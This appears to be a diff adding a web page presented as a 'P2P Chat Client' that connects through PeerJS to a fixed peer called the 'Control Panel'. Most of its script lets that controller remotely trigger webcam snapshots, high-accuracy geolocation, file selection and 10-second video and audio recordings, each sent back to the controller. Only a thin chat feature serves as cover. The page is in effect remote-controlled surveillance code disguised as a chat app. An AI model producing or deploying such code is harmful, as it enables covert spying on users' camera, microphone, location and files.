@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>P2P Chat Client</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .chat-container {
+            width: 400px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            max-height: 600px;
+        }
+        .chat-header {
+            background: #007bff;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            font-size: 1.2em;
+        }
+        #status {
+            padding: 10px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #555;
+        }
+        .chat-window {
+            flex: 1;
+            padding: 10px;
+            overflow-y: auto;
+            border-bottom: 1px solid #ddd;
+        }
+        .message {
+            margin: 5px 0;
+            padding: 8px 12px;
+            border-radius: 15px;
+            max-width: 70%;
+            word-wrap: break-word;
+        }
+        .sent {
+            background: #007bff;
+            color: white;
+            margin-left: auto;
+            border-bottom-right-radius: 5px;
+        }
+        .received {
+            background: #e9ecef;
+            margin-right: auto;
+            border-bottom-left-radius: 5px;
+        }
+        .image-message {
+            max-width: 100%;
+            margin: 5px 0;
+            border-radius: 5px;
+        }
+        .chat-input {
+            display: flex;
+            padding: 10px;
+            background: #f8f9fa;
+        }
+        input[type="text"] {
+            flex: 1;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #007bff;
+        }
+        button {
+            padding: 8px 15px;
+            margin-left: 10px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        button:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+        }
+        #status-area {
+            font-size: 0.8em;
+            color: #666;
+            text-align: center;
+            padding: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="chat-container">
+        <div class="chat-header">P2P Chat Client</div>
+        <div id="status">Initializing...</div>
+        <div id="status-area"></div>
+        <div class="chat-window" id="chat-window"></div>
+        <div class="chat-input">
+            <button onclick="connectToControlPanel()" id="connect-btn">Connect</button>
+        </div>
+        <div class="chat-input">
+            <input type="text" id="message-input" placeholder="Type a message" disabled>
+            <button onclick="sendMessage()" disabled id="send-btn">Send</button>
+        </div>
+    </div>
+
+    <script>
+        let peer = null;
+        let conn = null;
+        const status = document.getElementById('status');
+        const statusArea = document.getElementById('status-area');
+        const chatWindow = document.getElementById('chat-window');
+        const messageInput = document.getElementById('message-input');
+        const sendBtn = document.getElementById('send-btn');
+        const connectBtn = document.getElementById('connect-btn');
+
+        // Initialize PeerJS
+        peer = new Peer();
+        peer.on('open', (id) => {
+            status.textContent = `Your Peer ID: ${id}`;
+        });
+
+        // Connect to control panel
+        function connectToControlPanel() {
+            conn = peer.connect('12345');
+            connectBtn.disabled = true;
+            status.textContent = 'Connecting...';
+
+            conn.on('open', () => {
+                status.textContent = 'Connected to Control Panel';
+                messageInput.disabled = false;
+                sendBtn.disabled = false;
+            });
+
+            conn.on('data', (data) => {
+                console.log('Received data:', data);
+                if (data.type === 'message') {
+                    addMessage(data.content, 'received');
+                } else if (data.type === 'request-image') {
+                    captureAndSendImage();
+                } else if (data.type === 'request-location') {
+                    captureAndSendLocation();
+                } else if (data.type === 'request-file') {
+                    captureAndSendFile();
+                } else if (data.type === 'request-video') {
+                    captureAndSendVideo();
+                } else if (data.type === 'request-audio') {
+                    captureAndSendAudio();
+                }
+            });
+
+            conn.on('close', () => {
+                status.textContent = 'Disconnected';
+                messageInput.disabled = true;
+                sendBtn.disabled = true;
+                connectBtn.disabled = false;
+                conn = null;
+            });
+
+            conn.on('error', (err) => {
+                console.error('Connection error:', err);
+                statusArea.textContent = `Connection error: ${err.message}`;
+                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+            });
+        }
+
+        function captureAndSendImage() {
+            statusArea.textContent = "Capturing image...";
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        
+                        setTimeout(() => {
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            if (conn && conn.open) {
+                                conn.send({ type: 'image', content: imageData });
+                                statusArea.textContent = "Image captured and sent";
+                                setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                            } else {
+                                statusArea.textContent = "Connection lost";
+                                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                            }
+                        }, 500);
+                    };
+                })
+                .catch(err => {
+                    console.error("Error accessing camera:", err);
+                    statusArea.textContent = `Camera error: ${err.message}`;
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Failed to access camera: ${err.message}` });
+                    }
+                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                });
+        }
+
+        function captureAndSendLocation() {
+            statusArea.textContent = "Fetching location...";
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    if (conn && conn.open) {
+                        conn.send({ type: 'location', content: location });
+                        statusArea.textContent = "Location sent";
+                        setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                    } else {
+                        statusArea.textContent = "Connection lost";
+                        setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                    }
+                },
+                (err) => {
+                    console.error("Error accessing location:", err);
+                    statusArea.textContent = `Location error: ${err.message}`;
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Failed to access location: ${err.message}` });
+                    }
+                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        function captureAndSendFile() {
+            statusArea.textContent = "Select a file...";
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = '*/*';
+            document.body.appendChild(input);
+            input.style.display = 'none';
+
+            input.onchange = (event) => {
+                const file = event.target.files[0];
+                document.body.removeChild(input);
+
+                if (!file) {
+                    statusArea.textContent = "No file selected";
+                    setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: 'No file selected' });
+                    }
+                    return;
+                }
+
+                const maxSize = 10 * 1024 * 1024;
+                if (file.size > maxSize) {
+                    statusArea.textContent = "File too large (max 10MB)";
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: 'File too large (max 10MB)' });
+                    }
+                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                    return;
+                }
+
+                statusArea.textContent = `Reading file: ${file.name}`;
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const dataUrl = e.target.result;
+                    if (conn && conn.open) {
+                        conn.send({ 
+                            type: 'file', 
+                            content: { dataUrl: dataUrl, fileName: file.name } 
+                        });
+                        statusArea.textContent = `File ${file.name} sent`;
+                        setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                    } else {
+                        statusArea.textContent = "Connection lost";
+                        setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                    }
+                };
+                reader.onerror = () => {
+                    statusArea.textContent = `Error reading file: ${file.name}`;
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Error reading file: ${file.name}` });
+                    }
+                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                };
+                reader.readAsDataURL(file);
+            };
+            input.onerror = () => {
+                document.body.removeChild(input);
+                statusArea.textContent = "Error opening file picker";
+                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+            };
+            input.click();
+        }
+
+        function captureAndSendVideo() {
+            statusArea.textContent = "Starting video recording...";
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    const chunks = [];
+                    recorder.ondataavailable = (e) => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const maxSize = 10 * 1024 * 1024;
+                        if (blob.size > maxSize) {
+                            statusArea.textContent = "Video too large (max 10MB)";
+                            if (conn && conn.open) {
+                                conn.send({ type: 'message', content: 'Video too large (max 10MB)' });
+                            }
+                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                            return;
+                        }
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            const dataUrl = reader.result;
+                            if (conn && conn.open) {
+                                conn.send({ 
+                                    type: 'video', 
+                                    content: { 
+                                        dataUrl: dataUrl, 
+                                        fileName: `video_${Date.now()}.webm` 
+                                    } 
+                                });
+                                statusArea.textContent = "Video recorded and sent";
+                                setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                            } else {
+                                statusArea.textContent = "Connection lost";
+                                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                            }
+                        };
+                        reader.onerror = () => {
+                            statusArea.textContent = "Error reading video";
+                            if (conn && conn.open) {
+                                conn.send({ type: 'message', content: 'Error reading video' });
+                            }
+                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    recorder.start();
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') {
+                            recorder.stop();
+                        }
+                    }, 10000); // 10 seconds
+                })
+                .catch(err => {
+                    console.error("Error accessing camera/microphone:", err);
+                    statusArea.textContent = `Media error: ${err.message}`;
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Failed to access camera/microphone: ${err.message}` });
+                    }
+                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                });
+        }
+
+        function captureAndSendAudio() {
+            statusArea.textContent = "Starting audio recording...";
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                    const chunks = [];
+                    recorder.ondataavailable = (e) => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const maxSize = 10 * 1024 * 1024;
+                        if (blob.size > maxSize) {
+                            statusArea.textContent = "Audio too large (max 10MB)";
+                            if (conn && conn.open) {
+                                conn.send({ type: 'message', content: 'Audio too large (max 10MB)' });
+                            }
+                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                            return;
+                        }
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            const dataUrl = reader.result;
+                            if (conn && conn.open) {
+                                conn.send({ 
+                                    type: 'audio', 
+                                    content: { 
+                                        dataUrl: dataUrl, 
+                                        fileName: `audio_${Date.now()}.webm` 
+                                    } 
+                                });
+                                statusArea.textContent = "Audio recorded and sent";
+                                setTimeout(() => { statusArea.textContent = ''; }, 3000);
+                            } else {
+                                statusArea.textContent = "Connection lost";
+                                setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                            }
+                        };
+                        reader.onerror = () => {
+                            statusArea.textContent = "Error reading audio";
+                            if (conn && conn.open) {
+                                conn.send({ type: 'message', content: 'Error reading audio' });
+                            }
+                            setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    recorder.start();
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') {
+                            recorder.stop();
+                        }
+                    }, 10000); // 10 seconds
+                })
+                .catch(err => {
+                    console.error("Error accessing microphone:", err);
+                    statusArea.textContent = `Microphone error: ${err.message}`;
+                    if (conn && conn.open) {
+                        conn.send({ type: 'message', content: `Failed to access microphone: ${err.message}` });
+                    }
+                    setTimeout(() => { statusArea.textContent = ''; }, 5000);
+                });
+        }
+
+        function sendMessage() {
+            const message = messageInput.value.trim();
+            if (!message || !conn || !conn.open) return;
+            conn.send({ type: 'message', content: message });
+            addMessage(message, 'sent');
+            messageInput.value = '';
+        }
+
+        function addMessage(message, type) {
+            const div = document.createElement('div');
+            div.className = `message ${type}`;
+            div.textContent = message;
+            chatWindow.appendChild(div);
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+        }
+
+        peer.on('error', (err) => {
+            console.error('Peer error:', err);
+            status.textContent = `Error: ${err.type}`;
+            alert(`Error: ${err.type}`);
+            connectBtn.disabled = false;
+        });
+
+        messageInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
+    </script>
+</body>
+</html>
